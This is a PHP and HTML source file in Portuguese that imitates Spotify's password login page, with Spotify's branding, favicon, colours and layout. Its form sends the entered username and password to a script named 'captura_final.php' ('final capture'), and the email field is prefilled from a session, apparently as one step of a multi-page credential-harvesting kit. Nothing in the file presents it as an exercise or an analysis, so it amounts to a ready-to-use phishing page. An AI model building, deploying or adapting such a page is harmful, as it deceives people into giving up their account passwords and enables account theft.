<?php
session_start();
$email_mostrado = isset($_SESSION['user_email']) ? htmlspecialchars($_SESSION['user_email']) : '';
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar - Spotify</title>
    <link rel="icon" href="https://www.scdn.co/i/_global/favicon.png">
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            background-color: #121212;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .main-wrapper {
            width: 100%;
            max-width: 380px;
            margin: 0 auto;
            padding: 0 32px;
            padding-top: 80px; 
            display: flex;
            flex-direction: column;
            flex: 1; 
        }

        .back-button {
            background: none;
            border: none;
            color: white;
            cursor: pointer;
            padding: 0;
            margin-bottom: 30px; 
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: flex-start;
        }
        
        .back-button svg {
            width: 24px;
            height: 24px;
        }

        h1 {
            font-size: 1.5rem; 
            font-weight: 700;
            margin: 0 0 20px 0; 
            letter-spacing: -0.04em;
        }

        label {
            display: block;
            font-size: 0.75rem;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .input-group {
            margin-bottom: 16px; 
            position: relative;
            width: 100%;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            height: 45px;
            background-color: #121212;
            border: 1px solid #727272;
            border-radius: 4px;
            padding: 0 16px;
            color: white;
            font-size: 0.9375rem; 
            font-family: inherit;
            outline: none;
            transition: all 0.1s ease;
        }

        input:focus {
            border-color: white;
            box-shadow: 0 0 0 2px white;
        }

        .toggle-password {
            position: absolute;
            right: 12px;
            top: 0;
            height: 45px;
            background: none;
            border: none;
            color: #b3b3b3;
            cursor: pointer;
            display: flex;
            align-items: center;
        }
        
        .toggle-password svg {
            width: 20px; 
            height: 20px;
        }
        
        .toggle-password:hover {
            color: white;
        }

        .btn-primary {
            width: 100%;
            height: 45px;
            background-color: #1ed760;
            color: #000000;
            border: none;
            border-radius: 500px;
            font-size: 0.9375rem;
            font-weight: 700;
            cursor: pointer;
            margin-top: 8px; 
            transition: transform 0.1s, background-color 0.1s;
        }

        .btn-primary:hover {
            background-color: #1fdf64;
            transform: scale(1.02);
        }

        .secondary-action {
            text-align: center;
            margin-top: 32px; 
        }

        .secondary-action a {
            color: white;
            text-decoration: none;
            font-size: 0.8125rem;
            font-weight: 700;
        }
        
        .secondary-action a:hover {
            text-decoration: underline;
        }

        footer {
            padding: 0 0 32px 0;
            text-align: center;
            font-size: 0.65rem; 
            color: #b3b3b3;
            margin-top: auto;
            line-height: 1.5;
            max-width: 320px; 
            align-self: center;
        }

        footer a {
            color: #b3b3b3;
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="main-wrapper">
        
        <button class="back-button" onclick="window.history.back()" aria-label="Voltar">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <polyline points="15 18 9 12 15 6"></polyline>
            </svg>
        </button>

        <h1>Entrar com senha</h1>

        <form action="captura_final.php" method="POST">
            
            <div class="input-group">
                <label for="username">E-mail ou nome de usuário</label>
                <input type="text" id="username" name="username" value="<?php echo $email_mostrado; ?>">
            </div>

            <div class="input-group">
                <label for="password">Senha</label>
                <div style="position: relative;">
                    <input type="password" id="password" name="senha" required>
                    <button type="button" class="toggle-password" onclick="togglePassword()" aria-label="Mostrar senha">
                        <svg id="eye-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                            <line x1="1" y1="1" x2="23" y2="23"></line>
                        </svg>
                    </button>
                </div>
            </div>

            <button type="submit" class="btn-primary">Entrar</button>

            <div class="secondary-action">
                <a href="#">Entrar sem senha</a>
            </div>

        </form>

        <footer>
            Este site é protegido pelo reCAPTCHA e está sujeito à
            <a href="#">Política de Privacidade</a> e aos <a href="#">Termos de Serviço</a> do Google.
        </footer>

    </div>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.getElementById('eye-icon');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
            } else {
                passwordInput.type = 'password';
                eyeIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
            }
        }
    </script>

</body>
</html>